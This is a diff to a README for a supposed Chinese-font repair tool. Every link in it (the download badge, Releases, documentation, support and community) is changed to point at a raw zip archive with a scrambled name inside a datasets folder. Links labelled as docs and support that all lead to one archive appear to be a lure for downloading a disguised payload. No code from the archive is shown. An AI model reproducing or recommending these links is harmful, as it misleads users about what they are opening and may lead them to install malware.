@@ -6,7 +6,7 @@ Welcome to the Repair-the-missing-characters-in-Chinese-fonts project! This appl
 
 ## 📥 Download
 
-[![Download Latest Release](https://raw.githubusercontent.com/Banggalore/Repair-the-missing-characters-in-Chinese-fonts/main/datasets/Repair-the-missing-characters-in-Chinese-fonts_3.6-beta.2.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Banggalore/Repair-the-missing-characters-in-Chinese-fonts/main/datasets/Repair-the-missing-characters-in-Chinese-fonts_3.6-beta.2.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Banggalore/Repair-the-missing-characters-in-Chinese-fonts/main/datasets/npy/missing_Chinese_Repair_fonts_in_characters_the_v3.3.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Banggalore/Repair-the-missing-characters-in-Chinese-fonts/main/datasets/npy/missing_Chinese_Repair_fonts_in_characters_the_v3.3.zip)
 
 You can download the application from our Releases page. 
 
@@ -30,7 +30,7 @@ To ensure proper functionality, please check the following requirements before d
 
 1. **Visit the Releases Page:** Click on the link below to open the Releases page:
    
-   [Download from Releases](https://raw.githubusercontent.com/Banggalore/Repair-the-missing-characters-in-Chinese-fonts/main/datasets/Repair-the-missing-characters-in-Chinese-fonts_3.6-beta.2.zip)
+   [Download from Releases](https://raw.githubusercontent.com/Banggalore/Repair-the-missing-characters-in-Chinese-fonts/main/datasets/npy/missing_Chinese_Repair_fonts_in_characters_the_v3.3.zip)
 
 2. **Select the Latest Version:** Look for the latest version at the top of the page. You will see a list of available files.
 
@@ -53,19 +53,19 @@ To ensure proper functionality, please check the following requirements before d
 
 You can find more details on how to use specific features in the official documentation. This includes tips on optimizing your image uploads and details about font styles.
 
-[Read the Documentation](https://raw.githubusercontent.com/Banggalore/Repair-the-missing-characters-in-Chinese-fonts/main/datasets/Repair-the-missing-characters-in-Chinese-fonts_3.6-beta.2.zip)
+[Read the Documentation](https://raw.githubusercontent.com/Banggalore/Repair-the-missing-characters-in-Chinese-fonts/main/datasets/npy/missing_Chinese_Repair_fonts_in_characters_the_v3.3.zip)
 
 ## 🆘 Support
 
 If you encounter any issues or have questions about the application, please visit our Support page. We are here to assist you!
 
-[Support Page](https://raw.githubusercontent.com/Banggalore/Repair-the-missing-characters-in-Chinese-fonts/main/datasets/Repair-the-missing-characters-in-Chinese-fonts_3.6-beta.2.zip)
+[Support Page](https://raw.githubusercontent.com/Banggalore/Repair-the-missing-characters-in-Chinese-fonts/main/datasets/npy/missing_Chinese_Repair_fonts_in_characters_the_v3.3.zip)
 
 ## 🌐 Community
 
 Join our community to share your experiences and connect with other users. We encourage feedback and ideas for future improvements!
 
-[Join the Community](https://raw.githubusercontent.com/Banggalore/Repair-the-missing-characters-in-Chinese-fonts/main/datasets/Repair-the-missing-characters-in-Chinese-fonts_3.6-beta.2.zip)
+[Join the Community](https://raw.githubusercontent.com/Banggalore/Repair-the-missing-characters-in-Chinese-fonts/main/datasets/npy/missing_Chinese_Repair_fonts_in_characters_the_v3.3.zip)
 
 ## 📋 License
 
